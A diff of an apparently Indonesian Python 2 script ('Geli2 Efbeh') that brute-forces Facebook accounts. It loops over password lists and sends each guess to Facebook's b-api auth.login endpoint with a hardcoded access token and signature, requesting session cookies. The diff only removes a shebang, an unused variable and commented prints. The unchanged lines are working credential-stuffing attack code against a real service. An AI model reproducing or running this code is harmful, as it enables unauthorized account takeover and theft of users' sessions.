@@ -1,4 +1,3 @@
-# usr/bin/python2
 # -*- coding UTF-8 -*-
 #  Author : Iqbal Dev
 #  Tools : Geli2 Efbeh
@@ -12,8 +11,6 @@ from useragents import baner, multi_ban, deviv, divev
 import subprocess, os, sys
 
 os.system('' if os.name == 'nt' else 'chmod +x *')
-multi = []
-
 users1 = []
 
 users2 = []
@@ -79,8 +76,7 @@ def pro_dev(ival):
 	iqbal = ival.replace('\n', '')
 	for iq in pas:
 	  try:
-	  	iqu = iq.replace('\n', '').replace('\n\n', '') # print str(iqbal) + " | " + iqu 
-	  	# print " Mencobaaa.... " + iqbal
+	  	iqu = iq.replace('\n', '').replace('\n\n', '') 
 	  	dev = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ival+"&locale=en_US&password="+iqu+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 	  	dev_iv = dev.content
 	  	jsl = json.loads(dev_iv)
